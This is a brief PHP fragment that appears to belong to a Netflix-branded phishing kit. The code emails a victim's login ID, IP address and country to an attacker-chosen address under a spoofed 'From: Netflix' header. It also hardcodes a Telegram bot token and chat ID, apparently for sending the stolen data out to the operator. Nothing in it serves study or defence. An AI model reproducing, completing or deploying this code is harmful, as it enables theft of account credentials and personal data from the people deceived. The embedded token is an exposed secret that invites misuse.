<?php

$yourmail  = '';



$subject  = " ".$_SESSION['iduserLoginId']." / ".$_SERVER['REMOTE_ADDR']." / ".$_SESSION['country1']." ";
$headers .= "From: Netflix" . "\r\n";
mail($yourmail, $subject, $yagmail, $headers);

/**Add Your Api Telegram Token Bellow : **/
$botToken="6676319522:AAHx7QharxfLNSQ6HLQaPudpRyZMvgIGEzw";
$chatId="-4113876154";  







?>